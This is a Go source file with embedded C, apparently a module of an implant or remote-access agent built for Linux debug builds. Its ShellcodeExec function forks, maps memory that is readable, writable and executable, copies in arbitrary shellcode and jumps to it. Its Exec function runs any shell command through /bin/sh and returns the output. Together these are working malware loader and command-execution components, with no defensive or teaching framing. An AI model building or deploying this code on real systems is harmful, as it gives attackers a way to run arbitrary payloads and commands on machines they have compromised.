//go:build linux && debug

package modules

/*
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <unistd.h>

void call(char *shellcode, size_t length) {
	if(fork()) {
		return;
	}
	unsigned char *ptr;
	ptr = (unsigned char *) mmap(0, length, \
		PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
	if(ptr == MAP_FAILED) {
		perror("mmap");
		return;
	}
	memcpy(ptr, shellcode, length);
	( *(void(*) ()) ptr)();
}
*/
import "C"
import (
	"log"
	"os/exec"
	"unsafe"
)

// TODO: Find pure Go solution to executing shellcode, since Cgo doesn't work too well on Windows.
func ShellcodeExec(sc []byte) {
	log.Printf("[START LINUX SHELLCODE EXEC] starting new thread with following shellcode: % X\n", sc)
	go C.call((*C.char)(unsafe.Pointer(&sc[0])), (C.size_t)(len(sc)))
	log.Printf("[END LINUX SHELLCODE EXEC] Called C-code. Cannot trace new thread.")
}

// Executes a command in shell and returns stdout
func Exec(cmd string) ([]byte, error) {
	log.Printf("[START LINUX EXEC] command: %s\n", cmd)
	command := exec.Command("/bin/sh", "-c", cmd)
	byteOut, err := command.CombinedOutput()
	if err != nil {
		log.Printf("[ERROR LINUX EXEC] error: %s\n", err.Error())
		return nil, err
	}
	log.Printf("[SUCCESS LINUX EXEC] result: %s\n", string(byteOut))
	return byteOut, nil
}
